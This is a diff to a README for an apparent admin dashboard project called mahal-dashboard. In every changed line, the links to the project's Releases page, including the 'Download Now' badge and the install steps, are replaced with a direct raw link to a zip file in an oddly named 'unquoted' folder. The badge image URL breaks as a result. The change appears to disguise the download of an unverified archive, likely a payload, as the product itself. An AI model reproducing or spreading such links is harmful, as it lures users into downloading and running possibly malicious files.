@@ -1,6 +1,6 @@
 # 🌟 mahal-dashboard - Your Simple Admin Dashboard Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=for-the-badge)](https://github.com/Danielxxz/mahal-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/Danielxxz/mahal-dashboard/master/unquoted/mahal-dashboard.zip%20Now-%20-%23007bff?style=for-the-badge)](https://raw.githubusercontent.com/Danielxxz/mahal-dashboard/master/unquoted/mahal-dashboard.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To start using mahal-dashboard, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to go to our Releases page.
    
-   [Visit Release Page](https://github.com/Danielxxz/mahal-dashboard/releases)
+   [Visit Release Page](https://raw.githubusercontent.com/Danielxxz/mahal-dashboard/master/unquoted/mahal-dashboard.zip)
 
 2. **Download the Latest Version**: Look for the latest version on the page. You should see a list of downloadable files.
 
@@ -46,7 +46,7 @@ mahal-dashboard runs on various operating systems. Here are the requirements:
 
 To get started, head to the Releases page linked below and download the latest version of mahal-dashboard.
 
-[Download Now](https://github.com/Danielxxz/mahal-dashboard/releases)
+[Download Now](https://raw.githubusercontent.com/Danielxxz/mahal-dashboard/master/unquoted/mahal-dashboard.zip)
 
 ### How to Use
 
